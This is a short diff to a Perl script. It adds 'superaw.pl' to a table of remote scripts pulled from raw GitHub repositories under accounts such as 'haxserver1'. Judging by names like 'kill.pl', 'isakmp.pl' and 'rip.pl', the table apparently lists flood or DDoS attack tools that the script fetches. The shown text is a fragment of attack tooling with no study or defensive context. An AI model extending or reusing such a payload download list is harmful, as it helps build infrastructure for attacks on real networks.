@@ -23,6 +23,7 @@ my %tmp_files = (
     "isakmp.pl" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/isakmp.pl",
     "kill.pl" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/kill.pl",
     "killx.pl" => "raw.githubusercontent.com/haxserver1/jlkhsdhamnbsuygdamwnbsd/main/killx.pl",
+    "superaw.pl" => "raw.githubusercontent.com/haxserver1/jlkhsdhamnbsuygdamwnbsd/main/superaw.pl",
     "stdhex2.pl" => "raw.githubusercontent.com/haxserver1/jlkhsdhamnbsuygdamwnbsd/main/stdhex2.pl",
     "rip.pl" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/rip.pl",
     "srvloc.pl" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/srvloc.pl",
